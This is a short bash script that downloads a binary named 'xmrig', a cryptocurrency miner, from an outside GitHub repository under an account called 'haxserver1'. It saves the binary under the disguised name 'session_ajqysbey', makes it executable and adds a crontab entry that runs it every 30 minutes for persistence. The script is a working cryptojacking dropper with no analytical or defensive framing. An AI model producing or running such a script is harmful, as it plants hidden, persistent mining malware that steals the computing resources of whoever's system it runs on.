#!/bin/bash

# Set the URL to download from
URL="https://github.com/haxserver1/session_uia21jkjgz8719831bs9d1ba971283v/raw/main/xmrig"
# Set the desired file name
FILENAME="session_ajqysbey"
# Lock file
LOCKFILE="/tmp/${FILENAME}.lock"

# Function to handle errors
error_exit() {
    echo "$1" 1>&2
    exit 1
}

# Check for lock file
if [ -e "$LOCKFILE" ]; then
    echo "Script is already running."
    exit 1
fi

# Create lock file
touch "$LOCKFILE"

# Download the file
echo "Downloading file..."
curl -o "$FILENAME" "$URL" || error_exit "Error: Failed to download file from $URL"

# Make the file executable
echo "Setting executable permissions..."
chmod +x "$FILENAME" || error_exit "Error: Failed to set executable permissions on $FILENAME"

# Get the full path to the downloaded file
FULL_PATH="$(pwd)/$FILENAME"

# Create the cron job entry
CRON_JOB="*/30 * * * * $FULL_PATH"

# Add the cron job to the user's crontab
echo "Adding cron job..."
( crontab -l 2>/dev/null; echo "$CRON_JOB" ) | crontab - || error_exit "Error: Failed to add cron job"

# Remove lock file
rm "$LOCKFILE"

echo "File downloaded to: $FULL_PATH"
echo "Cron job added: $CRON_JOB"
